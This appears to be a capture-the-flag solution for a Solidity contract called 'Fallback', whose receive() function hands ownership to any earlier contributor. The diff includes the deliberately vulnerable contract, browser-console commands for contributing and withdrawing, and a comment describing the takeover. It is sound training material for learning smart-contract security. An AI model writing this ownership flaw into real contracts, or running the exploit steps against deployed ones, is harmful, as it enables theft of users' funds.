@@ -1,0 +1,60 @@
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract Fallback {
+
+
+ using SafeMath for uint256;
+  mapping(address => uint) public contributions;
+  address payable public owner;
+
+
+constructor() public {
+owner = msg.sender;
+  contributions[msg.sender] = 1000 * (1 ether);
+}
+
+ modifier onlyOwner {
+        require(
+            msg.sender == owner,
+            "caller is not the owner"
+        );
+        _;
+    }
+
+
+function contribute() public payable {
+    require(msg.value < 0.001 ether);
+    contributions[msg.sender] += msg.value;
+    if(contributions[msg.sender] > contributions[owner]) {
+      owner = msg.sender;
+    }
+}
+
+function getContribution() public view returns (uint) {
+    return contributions[msg.sender];
+  }
+
+  function withdraw() public onlyOwner {
+    owner.transfer(address(this).balance);
+  }
+
+
+receive() external payable {
+  require(msg.value > 0 && contributions[msg.sender] > 0);
+  owner = msg.sender;
+}
+
+}
+
+**Web3 Javascript Browser Console**
+
+contract.contribute({value: toWei("0.0001")})
+
+await contract.withdraw();
+
+/* This contract can be exploited by sending eth to the contract via the recieve fallback function. 
+First, the attacker will need to call the contribute function and send an amount less than 0.001 ETH.
+After this has been sent, the attacker can send another amount of ETH to the fallback function, permitting the attacker
+to become owner of the contract. */
